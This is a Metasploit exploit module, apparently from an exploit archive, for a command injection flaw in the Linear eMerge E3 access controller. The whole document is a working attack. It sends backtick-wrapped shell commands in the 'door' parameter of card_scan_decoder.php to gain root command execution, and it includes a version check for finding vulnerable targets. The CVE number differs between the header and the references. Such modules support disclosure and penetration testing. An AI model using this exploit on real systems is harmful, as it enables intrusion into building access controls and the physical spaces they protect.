# Vendor Homepage: http://linear-solutions.com/nsc_family/e3-series/
# Software Link: http://linear-solutions.com/nsc_family/e3-series/
# Version: 4.6.07
# Tested on: NA
# CVE : CVE-2019-7265
# Advisory: https://applied-risk.com/resources/ar-2019-009
# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
# Advisory: https://applied-risk.com/resources/ar-2019-005
# Tested on: GNU/Linux 3.14.54 (ARMv7 rev 10), Lighttpd 1.4.40, PHP/5.6.23
#

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
        &#039;Name&#039;           => &#039;Linear eMerge E3 Access Controller Command Injection&#039;,
        &#039;Description&#039;    => %q{
          This module exploits a command injection vulnerability in the Linear eMerge
          E3 Access Controller. The issue is triggered by an unsanitized exec() PHP
          function allowing arbitrary command execution with root privileges.
        },
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Author&#039;         =>
          [
            &#039;Gjoko Krstic <gjoko@applied-risk.com> &#039; # Discovery, Exploit, MSF Module
          ],
        &#039;References&#039;     =>
          [
            [ &#039;URL&#039;, &#039;https://applied-risk.com/labs/advisories&#039; ],
            [ &#039;URL&#039;, &#039;https://www.nortekcontrol.com&#039; ],
            [ &#039;CVE&#039;, &#039;2019-7256&#039;]
          ],
        &#039;Privileged&#039;     => false,
        &#039;Payload&#039;        =>
          {
            &#039;DisableNops&#039; => true,
          },
        &#039;Platform&#039;       => [ &#039;unix&#039; ],
        &#039;Arch&#039;           => ARCH_CMD,
        &#039;Targets&#039;        => [ [&#039;Linear eMerge E3&#039;, { }], ],
        &#039;DisclosureDate&#039; => "Oct 29 2019",
        &#039;DefaultTarget&#039;  => 0
      )
    )
  end

  def check
    res = send_request_cgi({
      &#039;uri&#039;        => normalize_uri(target_uri.path.to_s, "card_scan_decoder.php"),
      &#039;vars_get&#039;   =>
        {
         &#039;No&#039;      => &#039;251&#039;,
         &#039;door&#039;    => &#039;1337&#039;
        }
    })
    if res.code == 200 and res.to_s =~ /PHP\/5.6.23/
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  def http_send_command(cmd)
    uri = normalize_uri(target_uri.path.to_s, "card_scan_decoder.php")
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => uri,
      &#039;vars_get&#039; =>
        {
          &#039;No&#039;   => &#039;251&#039;,
          &#039;door&#039; => "`"+cmd+"`"
        }
    })
    unless res
      fail_with(Failure::Unknown, &#039;Exploit failed!&#039;)
    end
    res
  end

  def exploit
    http_send_command(payload.encoded)
    print_status("Sending #{payload.encoded.length} byte payload...")
  end
end

